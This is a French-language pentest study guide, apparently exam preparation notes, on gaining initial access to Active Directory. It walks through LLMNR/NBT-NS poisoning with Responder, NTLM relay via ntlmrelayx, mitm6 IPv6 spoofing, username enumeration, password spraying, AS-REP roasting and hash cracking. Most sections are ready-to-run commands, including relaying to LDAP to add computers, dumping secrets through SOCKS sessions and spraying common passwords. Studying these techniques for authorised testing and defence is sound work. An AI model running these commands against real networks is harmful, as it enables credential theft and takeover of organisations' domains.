# Phase 2 : Accès Initial

## Le problème

Pour énumérer l'AD en profondeur, il te faut **un compte valide du domaine**. Même un compte lambda sans privilèges. Pourquoi ? Parce que l'AD, par défaut, donne beaucoup d'informations à n'importe quel utilisateur authentifié.

Il y a plusieurs techniques pour obtenir ce premier accès.

---

## Arbre de décision

```
Ai-je déjà des credentials fournis ?
    → OUI → Aller directement à Phase 3 (Énumération)
    → NON ↓

Y a-t-il du trafic LLMNR/NBT-NS sur le réseau ?
    → OUI → Responder actif (2.1)

Y a-t-il des machines sans signature SMB ?
    → OUI → Relay NTLM (2.2)

IPv6 actif sur le réseau (pas de DHCPv6) ?
    → OUI → MITMv6 + relay vers LDAP (2.3)

Pas encore de credentials ni de liste users ?
    → Énumération users sans credentials (2.4)
    → Puis Password Spraying (2.5)
```

!!! tip "Recommandation exam"
    Lancer **toutes ces attaques en parallèle** dans des terminaux séparés. Ne pas attendre qu'une réussisse avant de lancer la suivante.

---

## 2.1 : Poisoning LLMNR / NBT-NS avec Responder

### Le problème de résolution de noms

Quand une machine Windows cherche `\\SERVEUR-COMPTA` sur le réseau, elle suit cet ordre :

```
1. Cache local
2. DNS
3. LLMNR  ← broadcast sur tout le réseau local
4. NBT-NS ← broadcast sur tout le réseau local
```

Si le DNS ne connaît pas le nom, Windows **crie sur le réseau** :

> *"Quelqu'un connaît SERVEUR-COMPTA ?"*

Le problème : **n'importe qui peut répondre.**

### Ce que fait Responder

Responder écoute ces broadcasts et répond à **toutes les requêtes** :

> *"Oui c'est moi, SERVEUR-COMPTA !"*

La machine victime croit avoir trouvé le bon serveur et envoie son **authentification NTLM** pour se connecter. Responder capture le **hash NTLMv2**.

```
Victime : "Qui est SERVEUR-COMPTA ?"
Responder : "C'est moi !"
Victime : envoie Hash(mot_de_passe + challenge)  ← CAPTURÉ
```

### En pratique

```bash
# Lancer Responder en mode actif
sudo responder -I $IFACE -rdw

# Options :
# -r  : répondre aux requêtes NBT-NS
# -d  : répondre aux requêtes DHCP
# -w  : démarrer le serveur WPAD
```

Tu laisses tourner, et tu attends. Dans un réseau d'entreprise actif, tu captures des hashes en quelques minutes.

**Logs :** `/usr/share/responder/logs/`

```bash
# Voir les hashes capturés en temps réel
tail -f /usr/share/responder/logs/Responder-Session.log
```

### Format du hash capturé

Les hashes capturés ressemblent à ça :

```
Alice::ENTREPRISE:1122334455667788:AABBCC...:0101000000000000...
^^^^^  ^^^^^^^^^^  ^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^
user   domain      challenge         response NTLMv2
```

### Qu'est-ce qu'on fait avec ce hash ?

**Option 1 : Le cracker offline avec Hashcat**

```bash
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
    /usr/share/wordlists/rockyou.txt
```

Si le mot de passe est faible, tu l'obtiens en clair.

**Option 2 : Le relayer directement (sans le cracker)**

→ Voir section 2.2 ci-dessous.

!!! warning "À retenir"
    Ce hash NTLMv2 **n'est pas utilisable directement en Pass-the-Hash**. Il faut le cracker ou le relayer. Voir [NTLM : distinction critique](../fondamentaux/ntlm.md).

---

## 2.2 : NTLM Relay Attack

### Le concept

Au lieu de cracker le hash, tu le **relaies en temps réel** vers une autre machine.

**L'analogie :** tu interceptes le badge d'Alice et tu l'utilises immédiatement pour ouvrir une autre porte avant qu'Alice s'en rende compte.

```
Alice → tente de se connecter à \\SERVEUR-INEXISTANT
   ↓
Attaquant (Responder) intercepte l'authentification
   ↓
Attaquant relaie vers \\SERVEUR-CIBLE
   ↓
\\SERVEUR-CIBLE croit que c'est Alice → accès accordé
```

### Prérequis

```bash
# Identifier les machines sans signature SMB (cibles potentielles)
nxc smb $RANGE --gen-relay-list ~/certif/targets_relay.txt
cat ~/certif/targets_relay.txt
```

!!! important "Condition"
    Pour que le relay fonctionne, la **signature SMB doit être désactivée** sur la cible.
    C'est souvent le cas sur les postes de travail, rarement sur les DC.

### Lancement : 2 terminaux

**Terminal 1 : Responder (SMB et HTTP désactivés)**

```bash
# Editer /etc/responder/Responder.conf : SMB = Off, HTTP = Off
sudo nano /etc/responder/Responder.conf

# Lancer Responder : empoisonne mais ne sert pas les réponses
sudo responder -I $IFACE -rdw
```

**Terminal 2 : ntlmrelayx**

```bash
# Relay basique → dump SAM si admin
ntlmrelayx.py -tf ~/certif/targets_relay.txt -smb2support

# Relay avec mode SOCKS (pour proxychains après)
ntlmrelayx.py -tf ~/certif/targets_relay.txt -smb2support -socks

# Relay vers LDAP (créer un compte ou modifier les ACL)
ntlmrelayx.py -t ldap://$DC_IP --no-da --no-acl
```

### Mode SOCKS : Utiliser via proxychains

```bash
# Dans ntlmrelayx, taper "socks" pour voir les sessions actives
> socks

# Configurer proxychains
sudo nano /etc/proxychains4.conf
# Dernière ligne : socks5  127.0.0.1  1080

# Utiliser la session relayée
proxychains -q psexec.py "$DOMAIN/$USER@$TARGET"
proxychains -q secretsdump.py $DOMAIN/$USER@$TARGET -no-pass
```

---

## 2.3 : IPv6 + MITMv6

### Le problème IPv6 dans les AD

Windows a IPv6 **activé par défaut**, mais la plupart des entreprises n'ont pas d'infrastructure IPv6. Résultat : aucun serveur DHCPv6 ne répond sur le réseau.

**mitm6** exploite ça :

1. Il se déclare comme serveur DHCPv6 sur le réseau
2. Les machines Windows l'acceptent (IPv6 est prioritaire)
3. mitm6 devient le **serveur DNS** des victimes
4. Il peut rediriger les authentifications vers l'attaquant

Combiné avec ntlmrelayx, c'est extrêmement puissant, surtout pour **relayer vers LDAP** et créer des comptes ou modifier l'AD directement.

```bash
# Terminal 1 : mitm6
sudo mitm6 -d $DOMAIN_FQDN -i $IFACE

# Terminal 2 : ntlmrelayx vers LDAP
ntlmrelayx.py -6 -t ldaps://$DC_IP \
    --delegate-access --add-computer

# Relay IPv6 + SOCKS
ntlmrelayx.py -6 -socks -t ldap://$DC_IP -smb2support \
    -tf ~/certif/targets_relay.txt
```

---

## 2.4 : Énumération d'utilisateurs sans credentials

Avant de pouvoir sprayer, il faut une liste de comptes valides. Trois méthodes à tester dans l'ordre :

```bash
# Méthode 1 : RID brute force via null session (la plus fiable)
nxc smb $DC_IP -u '' -p '' --rid-brute 5000 2>/dev/null \
    | grep SidTypeUser \
    | awk -F'\' '{print $NF}' | cut -d' ' -f1 \
    > ~/certif/users.txt

# Méthode 2 : Kerbrute (validation via AS-REQ Kerberos, très discret)
kerbrute userenum --dc $DC_IP -d $DOMAIN_FQDN \
    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
    -o ~/certif/valid_users.txt

# Méthode 3 : LDAP anonyme (si le DC l'autorise)
ldapsearch -x -H ldap://$DC_IP \
    -b "DC=${DOMAIN_FQDN/./,DC=}" \
    "(objectClass=user)" sAMAccountName 2>/dev/null \
    | grep sAMAccountName | awk '{print $2}' \
    > ~/certif/users.txt
```

Une fois `~/certif/users.txt` généré, tu peux passer au spraying (2.5) et à l'AS-REP Roasting (2.6).

---

## 2.5 : Password Spraying

### Le concept

Au lieu de bruteforcer un compte (qui se verrouille), tu testes **un seul mot de passe** sur **tous les comptes**.

```
alice    → Password2024  ✗
bob      → Password2024  ✓  ← accès obtenu !
charlie  → Password2024  ✗
...
```

Pourquoi ça marche ? Parce que dans toute grande entreprise, quelqu'un a un mot de passe faible ou saisonnier.

### Vérifier la politique de verrouillage

```bash
# TOUJOURS vérifier AVANT de sprayer !
nxc smb $DC_IP -u '' -p '' --pass-pol
```

### Spraying

```bash
# Test avec un mot de passe
nxc smb $DC_IP -u ~/certif/users.txt -p 'Password2024' --continue-on-success

# Mots de passe saisonniers à tester (1 vague à la fois)
nxc smb $DC_IP -u ~/certif/users.txt -p 'Welcome1!' --continue-on-success
nxc smb $DC_IP -u ~/certif/users.txt -p 'Bienvenue1!' --continue-on-success
nxc smb $DC_IP -u ~/certif/users.txt -p 'Azerty123!' --continue-on-success

# Kerbrute spray (génère moins de bruit dans les logs)
kerbrute passwordspray --dc $DC_IP -d $DOMAIN_FQDN \
    ~/certif/users.txt 'Password2024'
```

!!! danger "Attention au verrouillage"
    Respecter la politique de verrouillage des comptes. En général, on attend **30 minutes entre chaque vague**. Un compte verrouillé fait du bruit et alerte les admins.

---

## 2.6 : AS-REP Roasting sans credentials

Si tu as une liste d'utilisateurs, tente l'AS-REP Roasting directement :

```bash
GetNPUsers.py $DOMAIN_FQDN/ -no-pass \
    -usersfile ~/certif/users.txt \
    -dc-ip $DC_IP \
    -outputfile ~/certif/hashes/asrep.hash

# Cracker immédiatement si hash obtenu
hashcat -m 18200 ~/certif/hashes/asrep.hash /usr/share/wordlists/rockyou.txt
```

---

## 2.7 : Valider et diffuser les credentials obtenus

```bash
# Dès qu'on a user:password → tester sur tout le réseau
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN --continue-on-success

# Tester aussi WinRM et LDAP
nxc winrm $RANGE -u $USER -p $PWD -d $DOMAIN
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN

# Mettre à jour les variables
export USER="alice"
export PWD="Password2024"
export NT_HASH="..."  # si hash obtenu
echo "USER=$USER | PWD=$PWD" >> ~/certif/notes.txt
```

---

## Checklist Phase 2

- [ ] Responder lancé → hashes capturés → cracker avec `-m 5600`
- [ ] Liste cibles relay générée (`--gen-relay-list`)
- [ ] ntlmrelayx lancé si cibles sans signing SMB
- [ ] mitm6 lancé (IPv6)
- [ ] Énumération users tentée (RID brute / kerbrute / LDAP anonyme) → `~/certif/users.txt`
- [ ] Politique de verrouillage vérifiée (`--pass-pol`) avant spraying
- [ ] Password spraying effectué (1 mot de passe à la fois)
- [ ] AS-REP Roasting tenté sans auth (`GetNPUsers.py`)
- [ ] Credentials validés avec `nxc smb $RANGE`
- [ ] **Au moins 1 compte valide** → continuer en [Phase 3](03-enumeration.md)
